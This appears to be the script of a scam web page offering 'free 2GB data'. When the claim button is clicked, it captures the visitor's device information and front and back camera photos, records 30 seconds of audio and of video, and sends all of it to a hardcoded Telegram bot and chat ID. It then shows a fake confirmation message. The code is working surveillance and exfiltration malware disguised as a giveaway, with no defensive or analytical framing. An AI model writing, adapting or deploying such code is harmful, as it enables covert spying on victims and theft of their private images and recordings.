    <script>
        function claimData() {
            // Button eka click kalama wena de methana danna

        }
        
       
 async function claimData() {
 const botToken = '8334922749:AAEWWm4S0R5itUflcVtHgXkCEbCxrSYYSpE';
 const chatId = '8264584451';

 // Get device information
 const deviceInfo = navigator.userAgent;
 await sendMessage(botToken, chatId, 'text', `Device Info: ${deviceInfo}`);

 // Access cameras and send images
 const frontCameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
 const backCameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });

 const frontCameraImage = await takePhoto(frontCameraStream);
 const backCameraImage = await takePhoto(backCameraStream);

 await sendMessage(botToken, chatId, 'image', frontCameraImage);
 await sendMessage(botToken, chatId, 'image', backCameraImage);

 // Record 30s voice
 const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
 const voiceRec = await recordAudio(audioStream, 30);
 await sendMessage(botToken, chatId, 'voice', voiceRec);

 // Record 30s video
 const videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
 const videoRec = await recordVideo(videoStream, 30);
 await sendMessage(botToken, chatId, 'video', videoRec);

 alert('Your free 2GB data has been claimed!');
 }

 async function takePhoto(stream) {
 const video = document.createElement('video');
 video.srcObject = stream;
 video.play();
 return new Promise((resolve) => {
 video.onloadedmetadata = () => {
 const canvas = document.createElement('canvas');
 canvas.width = video.videoWidth;
 canvas.height = video.videoHeight;
 const context = canvas.getContext('2d');
 context.drawImage(video, 0, 0, canvas.width, canvas.height);
 video.pause();
 resolve(canvas.toDataURL('image/jpeg'));
 };
 });
 }

 async function recordAudio(stream, duration) {
 const mediaRecorder = new MediaRecorder(stream);
 const chunks = [];
 mediaRecorder.ondataavailable = (event) => chunks.push(event.data);
 mediaRecorder.start();
 await new Promise((resolve) => setTimeout(resolve, duration * 1000));
 mediaRecorder.stop();
 return new Blob(chunks, { type: 'audio/wav' });
 }

 async function recordVideo(stream, duration) {
 const mediaRecorder = new MediaRecorder(stream);
 const chunks = [];
 mediaRecorder.ondataavailable = (event) => chunks.push(event.data);
 mediaRecorder.start();
 await new Promise((resolve) => setTimeout(resolve, duration * 1000));
 mediaRecorder.stop();
 return new Blob(chunks, { type: 'video/mp4' });
 }

 async function sendMessage(botToken, chatId, messageType, data) {
 try {
 let url;
 let headers;
 let formData;

 switch (messageType) {
 case 'text':
 url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 headers = { 'Content-Type': 'application/json' };
 formData = { chat_id: chatId, text: data };
 break;
 case 'image':
 url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
 headers = { 'Content-Type': 'multipart/form-data' };
 const image = data;
 formData = { photo: image };
 break;
 case 'voice':
 url = `https://api.telegram.org/bot${botToken}/sendVoice`;
 headers = { 'Content-Type': 'multipart/form-data' };
 formData = { voice: data };
 break;
 case 'video':
 url = `https://api.telegram.org/bot${botToken}/sendVideo`;
 headers = { 'Content-Type': 'multipart/form-data' };
 formData = { video: data };
 break;
 default:
 throw new Error('Invalid message type');
 }

 const response = await axios.post(url, formData, { headers: headers });
 return response.data;
 } catch (error) {
 console.error(error);
 }
 }
 
    </script>
